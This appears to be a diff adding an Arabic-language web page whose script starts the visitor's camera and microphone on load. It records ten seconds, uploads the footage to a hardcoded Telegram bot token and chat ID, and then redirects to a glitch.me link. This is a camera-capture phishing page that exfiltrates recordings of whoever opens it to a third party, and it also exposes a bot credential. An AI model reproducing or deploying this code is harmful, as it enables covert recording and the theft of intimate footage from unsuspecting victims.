@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل وإرسال فيديو</title>
+    <style>
+        body { text-align: center; font-family: Arial, sans-serif; }
+        video { width: 90%; max-width: 600px; border: 2px solid black; display: none; }
+        .loading { font-size: 20px; color: red; }
+    </style>
+</head>
+<body>
+
+    <h2 id="status">جارٍ تشغيل الكاميرا والتسجيل...</h2>
+    <video id="video" autoplay></video>
+
+    <script>
+        let botToken = "7804774413:AAFBhGgO5v-5vKMKfJ2g9IrCcjb3XBnpUZE"; // استبدلي بتوكن البوت
+        let chatId = "6917296987"; // استبدلي بمعرف البوت أو المجموعة
+        let videoElement = document.getElementById("video");
+        let statusText = document.getElementById("status");
+        let mediaRecorder;
+        let recordedChunks = [];
+
+        // تشغيل الكاميرا والميكروفون
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            .then(stream => {
+                videoElement.srcObject = stream;
+                videoElement.style.display = "block"; // إظهار الفيديو
+                statusText.innerText = "يتم التسجيل الآن...";
+
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = event => recordedChunks.push(event.data);
+
+                mediaRecorder.onstop = () => {
+                    let blob = new Blob(recordedChunks, { type: "video/webm" });
+                    sendVideoToTelegram(blob);
+                };
+
+                // بدء التسجيل تلقائيًا
+                recordedChunks = [];
+                mediaRecorder.start();
+
+                // إيقاف التسجيل بعد 10 ثوانٍ تلقائيًا
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    statusText.innerText = "جارٍ إرسال الفيديو...";
+                }, 10000);
+            })
+            .catch(error => {
+                statusText.innerText = "❌ لا يمكن تشغيل الكاميرا! تأكدي من الأذونات.";
+                console.error(error);
+            });
+
+        function sendVideoToTelegram(videoBlob) {
+            let formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("video", videoBlob, "video.webm");
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+                method: "POST",
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    statusText.innerText = "✅ تم إرسال الفيديو! جاري الانتقال...";
+                    setTimeout(() => {
+                        window.location.href = "https://glitch.me/capture?chatId=6917296"; // استبدلي بالرابط المطلوب
+                    }, 2000);
+                } else {
+                    statusText.innerText = "❌ فشل في إرسال الفيديو!";
+                }
+            })
+            .catch(error => {
+                statusText.innerText = "❌ خطأ في الاتصال!";
+                console.error(error);
+            });
+        }
+    </script>
+
+</body>
+</html>
